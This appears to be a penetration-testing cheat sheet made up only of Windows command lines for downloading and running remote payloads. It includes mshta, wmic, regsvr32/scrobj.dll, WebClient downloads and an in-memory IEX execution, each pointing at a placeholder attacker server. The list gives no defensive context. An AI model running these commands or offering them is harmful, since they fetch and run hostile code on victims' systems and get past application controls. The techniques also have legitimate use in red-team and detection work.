

```powershell
# Method 1
mshta vbscript:Close(Execute("GetObject(""script:http://IP/payload.sct"")"))

# Method 2
mshta http://IP/payload.hta

# Method 3 (Using WebDav)
mshta \\IP\payload.hta

#Download and execute XSL using wmic
wmic os get /format:"https://webserver/payload.xsl"


# Download and execute over a WebServer:
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll

# Using WebDAV
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll

# Powershell Cmdlet
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"

# Powershell One-Line
(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 

# In Memory Execution
IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
```